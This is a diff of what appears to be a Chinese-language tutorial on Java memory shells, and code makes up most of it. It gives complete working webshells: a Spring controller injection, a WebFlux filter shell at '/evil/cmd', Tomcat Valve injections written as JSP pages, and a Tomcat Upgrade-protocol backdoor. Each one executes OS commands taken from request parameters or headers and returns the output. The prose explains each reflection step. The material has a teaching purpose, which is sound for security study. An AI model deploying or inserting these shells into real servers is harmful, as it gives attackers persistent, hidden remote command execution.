-        InjectedController injectedController = new InjectedController();
-        requestMappingHandlerMapping.registerMapping(info, injectedController, method);
-        return "[+] Inject successfully!<br>[+] shell url: http://localhost:8080" + controllerName + "?cmd=ipconfig";
-    }
+    @RequestMapping("/inject")
+    public String inject() throws Exception{
+        String controllerName = "/" + getRandomString();
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
+        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
+        Method method = InjectedController.class.getMethod("cmd");
+        PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
+        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
+        RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);
+        InjectedController injectedController = new InjectedController();
+        requestMappingHandlerMapping.registerMapping(info, injectedController, method);
+        return "[+] Inject successfully!<br>[+] shell url: http://localhost:8080" + controllerName + "?cmd=ipconfig";
+    }
 
-    @RestController
-    public static class InjectedController {
+    @RestController
+    public static class InjectedController {
 
-        public InjectedController(){
-        }
+        public InjectedController(){
+        }
 
-        public void cmd() throws Exception {
-            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
-            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
-            response.setCharacterEncoding("GBK");
-            if (request.getParameter("cmd") != null) {
-                boolean isLinux = true;
-                String osTyp = System.getProperty("os.name");
-                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
-                    isLinux = false;
-                }
-                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
-                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-                Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
-                String output = s.hasNext() ? s.next() : "";
-                response.getWriter().write(output);
-                response.getWriter().flush();
-                response.getWriter().close();
-            }
-        }
-    }
+        public void cmd() throws Exception {
+            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
+            response.setCharacterEncoding("GBK");
+            if (request.getParameter("cmd") != null) {
+                boolean isLinux = true;
+                String osTyp = System.getProperty("os.name");
+                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+                    isLinux = false;
+                }
+                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
+                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
+                String output = s.hasNext() ? s.next() : "";
+                response.getWriter().write(output);
+                response.getWriter().flush();
+                response.getWriter().close();
+            }
+        }
+    }
 }
 
 
@@ -689,14 +689,14 @@ public class TestEvilController {
 代码的关键在于如下这几行：
 
 ```
-WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
-RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
-Method method = InjectedController.class.getMethod("cmd");
-PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
-RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
-RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);
-InjectedController injectedController = new InjectedController();
-requestMappingHandlerMapping.registerMapping(info, injectedController, method);
+WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
+RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
+Method method = InjectedController.class.getMethod("cmd");
+PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
+RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
+RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);
+InjectedController injectedController = new InjectedController();
+requestMappingHandlerMapping.registerMapping(info, injectedController, method);
 
 
 ```
@@ -725,122 +725,122 @@ requestMappingHandlerMapping.registerMapping(info, injectedController, method)
 由`2.12.5`节的分析我们可以写出下面的代码：
 
 ```
-package org.example.webfluxmemoryshelldemo.memoryshell;
+package org.example.webfluxmemoryshelldemo.memoryshell;
 
-import org.springframework.boot.web.embedded.netty.NettyWebServer;
-import org.springframework.context.annotation.Configuration;
-import org.springframework.core.io.buffer.DataBuffer;
-import org.springframework.core.io.buffer.DefaultDataBufferFactory;
-import org.springframework.http.MediaType;
-import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
-import org.springframework.http.server.reactive.ServerHttpRequest;
-import org.springframework.http.server.reactive.ServerHttpResponse;
-import org.springframework.web.server.ServerWebExchange;
-import org.springframework.web.server.WebFilter;
-import org.springframework.web.server.WebFilterChain;
-import org.springframework.web.server.WebHandler;
-import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
-import org.springframework.web.server.handler.DefaultWebFilterChain;
-import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
-import org.springframework.web.server.handler.FilteringWebHandler;
-import reactor.core.publisher.Flux;
-import reactor.core.publisher.Mono;
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.lang.reflect.Array;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
-import java.lang.reflect.Modifier;
-import java.nio.charset.StandardCharsets;
-import java.util.ArrayList;
-import java.util.List;
+import org.springframework.boot.web.embedded.netty.NettyWebServer;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.core.io.buffer.DataBuffer;
+import org.springframework.core.io.buffer.DefaultDataBufferFactory;
+import org.springframework.http.MediaType;
+import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
+import org.springframework.http.server.reactive.ServerHttpRequest;
+import org.springframework.http.server.reactive.ServerHttpResponse;
+import org.springframework.web.server.ServerWebExchange;
+import org.springframework.web.server.WebFilter;
+import org.springframework.web.server.WebFilterChain;
+import org.springframework.web.server.WebHandler;
+import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
+import org.springframework.web.server.handler.DefaultWebFilterChain;
+import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
+import org.springframework.web.server.handler.FilteringWebHandler;
+import reactor.core.publisher.Flux;
+import reactor.core.publisher.Mono;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.lang.reflect.Array;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.lang.reflect.Modifier;
+import java.nio.charset.StandardCharsets;
+import java.util.ArrayList;
+import java.util.List;
 
 @Configuration
-public class MemoryShellFilter implements WebFilter{
+public class MemoryShellFilter implements WebFilter{
 
-    public static void doInject() {
-        Method getThreads;
-        try {
-            getThreads = Thread.class.getDeclaredMethod("getThreads");
-            getThreads.setAccessible(true);
-            Object threads = getThreads.invoke(null);
-            for (int i = 0; i < Array.getLength(threads); i++) {
-                Object thread = Array.get(threads, i);
-                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
-                    NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
-                    ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
-                    Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler", false);
-                    HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,"delegate", false);
-                    ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,"delegate", true);
-                    FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,"delegate", true);
-                    DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
-                    Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
-                    List<WebFilter> newAllFilters = new ArrayList<>(defaultWebFilterChain.getFilters());
-                    newAllFilters.add(0, new MemoryShellFilter());
-                    DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
-                    Field f = filteringWebHandler.getClass().getDeclaredField("chain");
-                    f.setAccessible(true);
-                    Field modifersField = Field.class.getDeclaredField("modifiers");
-                    modifersField.setAccessible(true);
-                    modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
-                    f.set(filteringWebHandler, newChain);
-                    modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
-                }
-            }
-        } catch (Exception ignored) {}
-    }
+    public static void doInject() {
+        Method getThreads;
+        try {
+            getThreads = Thread.class.getDeclaredMethod("getThreads");
+            getThreads.setAccessible(true);
+            Object threads = getThreads.invoke(null);
+            for (int i = 0; i < Array.getLength(threads); i++) {
+                Object thread = Array.get(threads, i);
+                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
+                    NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
+                    ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
+                    Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler", false);
+                    HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,"delegate", false);
+                    ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,"delegate", true);
+                    FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,"delegate", true);
+                    DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
+                    Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
+                    List<WebFilter> newAllFilters = new ArrayList<>(defaultWebFilterChain.getFilters());
+                    newAllFilters.add(0, new MemoryShellFilter());
+                    DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
+                    Field f = filteringWebHandler.getClass().getDeclaredField("chain");
+                    f.setAccessible(true);
+                    Field modifersField = Field.class.getDeclaredField("modifiers");
+                    modifersField.setAccessible(true);
+                    modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
+                    f.set(filteringWebHandler, newChain);
+                    modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
+                }
+            }
+        } catch (Exception ignored) {}
+    }
 
-    public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception {
-        Field f;
-        if(superClass){
-            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);
-        }else {
-            f = obj.getClass().getDeclaredField(fieldName);
-        }
-        f.setAccessible(true);
-        return f.get(obj);
-    }
+    public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception {
+        Field f;
+        if(superClass){
+            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);
+        }else {
+            f = obj.getClass().getDeclaredField(fieldName);
+        }
+        f.setAccessible(true);
+        return f.get(obj);
+    }
 
-    public Flux<DataBuffer> getPost(ServerWebExchange exchange) {
-        ServerHttpRequest request = exchange.getRequest();
-        String path = request.getURI().getPath();
-        String query = request.getURI().getQuery();
+    public Flux<DataBuffer> getPost(ServerWebExchange exchange) {
+        ServerHttpRequest request = exchange.getRequest();
+        String path = request.getURI().getPath();
+        String query = request.getURI().getQuery();
 
-        if (path.equals("/evil/cmd") && query != null && query.startsWith("command=")) {
-            String command = query.substring(8);
-            try {
-                Process process = Runtime.getRuntime().exec("cmd /c" + command);
-                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
-                Flux<DataBuffer> response = Flux.create(sink -> {
-                    try {
-                        String line;
-                        while ((line = reader.readLine()) != null) {
-                            sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));
-                        }
-                        sink.complete();
-                    } catch (IOException ignored) {}
-                });
+        if (path.equals("/evil/cmd") && query != null && query.startsWith("command=")) {
+            String command = query.substring(8);
+            try {
+                Process process = Runtime.getRuntime().exec("cmd /c" + command);
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
+                Flux<DataBuffer> response = Flux.create(sink -> {
+                    try {
+                        String line;
+                        while ((line = reader.readLine()) != null) {
+                            sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));
+                        }
+                        sink.complete();
+                    } catch (IOException ignored) {}
+                });
 
-                exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);
-                return response;
-            } catch (IOException ignored) {}
-        }
-        return Flux.empty();
-    }
+                exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);
+                return response;
+            } catch (IOException ignored) {}
+        }
+        return Flux.empty();
+    }
 
-    @Override
-    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
-        if (exchange.getRequest().getURI().getPath().startsWith("/evil/")) {
-            doInject();
-            Flux<DataBuffer> response = getPost(exchange);
-            ServerHttpResponse serverHttpResponse = exchange.getResponse();
-            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);
-            return serverHttpResponse.writeWith(response);
-        } else {
-            return chain.filter(exchange);
-        }
-    }
+    @Override
+    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
+        if (exchange.getRequest().getURI().getPath().startsWith("/evil/")) {
+            doInject();
+            Flux<DataBuffer> response = getPost(exchange);
+            ServerHttpResponse serverHttpResponse = exchange.getResponse();
+            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);
+            return serverHttpResponse.writeWith(response);
+        } else {
+            return chain.filter(exchange);
+        }
+    }
 }
 
 
@@ -857,13 +857,13 @@ public class MemoryShellFilter implements WebFilter{
 先是通过反射来获取当前运行的所有线程组，然后遍历线程数组，检查每个线程是否为`NettyWebServer`实例。如果发现一个线程是`NettyWebServer`，那就继续下一步的操作。接下来就是找`DefaultWebFilterChain`对象：
 
 ```
-NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
-ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
-Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler", false);
-HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,"delegate", false);
-ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,"delegate", true);
-FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,"delegate", true);
-DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
+NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
+ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
+Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler", false);
+HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,"delegate", false);
+ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,"delegate", true);
+FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,"delegate", true);
+DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
 
 
 ```
@@ -873,10 +873,10 @@ DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFie
 然后就是修改这个过滤器链，添加我们自定义的恶意 filter，并把它放到第一位：
 
 ```
-Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
-List<WebFilter> newAllFilters = new ArrayList<>(defaultWebFilterChain.getFilters());
-newAllFilters.add(0, new MemoryShellFilter());
-DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
+Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
+List<WebFilter> newAllFilters = new ArrayList<>(defaultWebFilterChain.getFilters());
+newAllFilters.add(0, new MemoryShellFilter());
+DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
 
 
 ```
@@ -884,13 +884,13 @@ DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) han
 然后通过反射获取`FilteringWebHandler`的私有字段`chain`，设置为可访问之后，通过反射将原始的过滤器链替换为新创建的过滤器链`newChain`，然后恢复字段的可访问权限：
 
 ```
-Field f = filteringWebHandler.getClass().getDeclaredField("chain");
+Field f = filteringWebHandler.getClass().getDeclaredField("chain");
 f.setAccessible(true);
-Field modifersField = Field.class.getDeclaredField("modifiers");
+Field modifersField = Field.class.getDeclaredField("modifiers");
 modifersField.setAccessible(true);
-modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
-f.set(filteringWebHandler, newChain);
-modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
+modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
+f.set(filteringWebHandler, newChain);
+modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
 
 
 ```
@@ -906,13 +906,13 @@ modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
 我这里是新建了一个项目，并创建配置好了`web`目录和`tomcat`环境，`pom.xml`中的依赖如下：
 
 ```
-    <dependencies>
-        <dependency>
-            <groupId>org.apache.tomcat</groupId>
-            <artifactId>tomcat-catalina</artifactId>
-            <version>9.0.83</version>
-        </dependency>
-    </dependencies>
+    <dependencies>
+        <dependency>
+            <groupId>org.apache.tomcat</groupId>
+            <artifactId>tomcat-catalina</artifactId>
+            <version>9.0.83</version>
+        </dependency>
+    </dependencies>
 
 
 ```
@@ -924,49 +924,49 @@ modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
 在`web`目录下新建一个`666.jsp`：
 
 ```
-<%@ page import="java.lang.reflect.Field" %>
-<%@ page import="org.apache.catalina.connector.Request" %>
-<%@ page import="org.apache.catalina.valves.ValveBase" %>
-<%@ page import="org.apache.catalina.connector.Response" %>
-<%@ page import="java.io.IOException" %>
-<%@ page import="org.apache.catalina.core.*" %>
-<%@ page import="java.io.InputStream" %>
-<%@ page import="java.util.Scanner" %>
-<%@ page import="java.io.PrintWriter" %>
-<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.valves.ValveBase" %>
+<%@ page import="org.apache.catalina.connector.Response" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.catalina.core.*" %>
+<%@ page import="java.io.InputStream" %>
+<%@ page import="java.util.Scanner" %>
+<%@ page import="java.io.PrintWriter" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
 <%
-    Field requestField = request.getClass().getDeclaredField("request");
-    requestField.setAccessible(true);
-    final Request req = (Request) requestField.get(request);
-    StandardContext standardContext = (StandardContext) req.getContext();
-    Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");
-    pipelineField.setAccessible(true);
-    StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext);
-    ValveBase evilValve = new ValveBase() {
-        @Override
-        public void invoke(Request request, Response response) throws ServletException,IOException {
-            if (request.getParameter("cmd") != null) {
-                boolean isLinux = true;
-                String osTyp = System.getProperty("os.name");
-                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
-                    isLinux = false;
-                }
-                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
-                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-                Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
-                String output = s.hasNext() ? s.next() : "";
-                response.setCharacterEncoding("GBK");
-                PrintWriter out = response.getWriter();
-                out.println(output);
-                out.flush();
-                out.close();
-                this.getNext().invoke(request, response);
-            }
-        }
-    };
-    evilStandardPipeline.addValve(evilValve);
-    out.println("inject success");
+    Field requestField = request.getClass().getDeclaredField("request");
+    requestField.setAccessible(true);
+    final Request req = (Request) requestField.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+    Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");
+    pipelineField.setAccessible(true);
+    StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext);
+    ValveBase evilValve = new ValveBase() {
+        @Override
+        public void invoke(Request request, Response response) throws ServletException,IOException {
+            if (request.getParameter("cmd") != null) {
+                boolean isLinux = true;
+                String osTyp = System.getProperty("os.name");
+                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+                    isLinux = false;
+                }
+                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
+                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
+                String output = s.hasNext() ? s.next() : "";
+                response.setCharacterEncoding("GBK");
+                PrintWriter out = response.getWriter();
+                out.println(output);
+                out.flush();
+                out.close();
+                this.getNext().invoke(request, response);
+            }
+        }
+    };
+    evilStandardPipeline.addValve(evilValve);
+    out.println("inject success");
 %>
 
 
@@ -979,49 +979,49 @@ modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
 下面的则是调用 `standardContext.getPipeline().addValve`实现的：
 
 ```
-<%@ page import="java.lang.reflect.Field" %>
-<%@ page import="org.apache.catalina.connector.Request" %>
-<%@ page import="org.apache.catalina.valves.ValveBase" %>
-<%@ page import="org.apache.catalina.connector.Response" %>
-<%@ page import="java.io.IOException" %>
-<%@ page import="org.apache.catalina.core.*" %>
-<%@ page import="java.io.InputStream" %>
-<%@ page import="java.util.Scanner" %>
-<%@ page import="java.io.PrintWriter" %>
-<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.valves.ValveBase" %>
+<%@ page import="org.apache.catalina.connector.Response" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.catalina.core.*" %>
+<%@ page import="java.io.InputStream" %>
+<%@ page import="java.util.Scanner" %>
+<%@ page import="java.io.PrintWriter" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
 <%
-  class testEvilValve extends ValveBase {
-    @Override
-    public void invoke(Request request, Response response) throws ServletException,IOException {
-      if (request.getParameter("command") != null) {
-        boolean isLinux = true;
-        String osTyp = System.getProperty("os.name");
-        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
-          isLinux = false;
-        }
-        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("command")} : new String[]{"cmd.exe", "/c", request.getParameter("command")};
-        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
-        String output = s.hasNext() ? s.next() : "";
-        response.setCharacterEncoding("GBK");
-        PrintWriter out = response.getWriter();
-        out.println(output);
-        out.flush();
-        out.close();
-        this.getNext().invoke(request, response);
-      }
-    }
-  };
+  class testEvilValve extends ValveBase {
+    @Override
+    public void invoke(Request request, Response response) throws ServletException,IOException {
+      if (request.getParameter("command") != null) {
+        boolean isLinux = true;
+        String osTyp = System.getProperty("os.name");
+        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+          isLinux = false;
+        }
+        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("command")} : new String[]{"cmd.exe", "/c", request.getParameter("command")};
+        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
+        String output = s.hasNext() ? s.next() : "";
+        response.setCharacterEncoding("GBK");
+        PrintWriter out = response.getWriter();
+        out.println(output);
+        out.flush();
+        out.close();
+        this.getNext().invoke(request, response);
+      }
+    }
+  };
 %>
 
 <%
-  Field requestField = request.getClass().getDeclaredField("request");
-  requestField.setAccessible(true);
-  final Request req = (Request) requestField.get(request);
-  StandardContext standardContext = (StandardContext) req.getContext();
-  standardContext.getPipeline().addValve(new testEvilValve());
-  out.println("inject success");
+  Field requestField = request.getClass().getDeclaredField("request");
+  requestField.setAccessible(true);
+  final Request req = (Request) requestField.get(request);
+  StandardContext standardContext = (StandardContext) req.getContext();
+  standardContext.getPipeline().addValve(new testEvilValve());
+  out.println("inject success");
 %>
 
 
@@ -1037,97 +1037,97 @@ modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
 由`2.14.2`节中的分析，我们可以写出如下`java`代码：
 
 ```
-package org.example;
+package org.example;
 
-import javax.servlet.annotation.WebServlet;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import org.apache.catalina.connector.Connector;
-import org.apache.catalina.connector.RequestFacade;
-import org.apache.catalina.connector.Request;
-import org.apache.coyote.Adapter;
-import org.apache.coyote.Processor;
-import org.apache.coyote.UpgradeProtocol;
-import org.apache.coyote.Response;
-import org.apache.coyote.http11.AbstractHttp11Protocol;
-import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
-import org.apache.tomcat.util.net.SocketWrapperBase;
-import java.lang.reflect.Field;
-import java.nio.ByteBuffer;
-import java.util.HashMap;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.apache.catalina.connector.Connector;
+import org.apache.catalina.connector.RequestFacade;
+import org.apache.catalina.connector.Request;
+import org.apache.coyote.Adapter;
+import org.apache.coyote.Processor;
+import org.apache.coyote.UpgradeProtocol;
+import org.apache.coyote.Response;
+import org.apache.coyote.http11.AbstractHttp11Protocol;
+import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
+import org.apache.tomcat.util.net.SocketWrapperBase;
+import java.lang.reflect.Field;
+import java.nio.ByteBuffer;
+import java.util.HashMap;
 
 @WebServlet("/evil")
-public class TestUpgrade extends HttpServlet {
+public class TestUpgrade extends HttpServlet {
 
-    static class MyUpgrade implements UpgradeProtocol {
-        @Override
-        public String getHttpUpgradeName(boolean b) {
-            return null;
-        }
+    static class MyUpgrade implements UpgradeProtocol {
+        @Override
+        public String getHttpUpgradeName(boolean b) {
+            return null;
+        }
 
-        @Override
-        public byte[] getAlpnIdentifier() {
-            return new byte[0];
-        }
+        @Override
+        public byte[] getAlpnIdentifier() {
+            return new byte[0];
+        }
 
-        @Override
-        public String getAlpnName() {
-            return null;
-        }
+        @Override
+        public String getAlpnName() {
+            return null;
+        }
 
-        @Override
-        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
-            return null;
-        }
+        @Override
+        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
+            return null;
+        }
 
-        @Override
-        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
-            return null;
-        }
+        @Override
+        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
+            return null;
+        }
 
-        @Override
-        public boolean accept(org.apache.coyote.Request request) {
-            String p = request.getHeader("cmd");
-            try {
-                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
-                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
-                response.setAccessible(true);
-                Response resp = (Response) response.get(request);
-                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), "GBK").useDelimiter("\\A").next().getBytes();
-                resp.setCharacterEncoding("GBK");
-                resp.doWrite(ByteBuffer.wrap(result));
-            } catch (Exception ignored) {}
-            return false;
-        }
-    }
-    @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
-        try {
-            RequestFacade rf = (RequestFacade) req;
-            Field requestField = RequestFacade.class.getDeclaredField("request");
-            requestField.setAccessible(true);
-            Request request1 = (Request) requestField.get(rf);
+        @Override
+        public boolean accept(org.apache.coyote.Request request) {
+            String p = request.getHeader("cmd");
+            try {
+                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
+                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
+                response.setAccessible(true);
+                Response resp = (Response) response.get(request);
+                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), "GBK").useDelimiter("\\A").next().getBytes();
+                resp.setCharacterEncoding("GBK");
+                resp.doWrite(ByteBuffer.wrap(result));
+            } catch (Exception ignored) {}
+            return false;
+        }
+    }
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
+        try {
+            RequestFacade rf = (RequestFacade) req;
+            Field requestField = RequestFacade.class.getDeclaredField("request");
+            requestField.setAccessible(true);
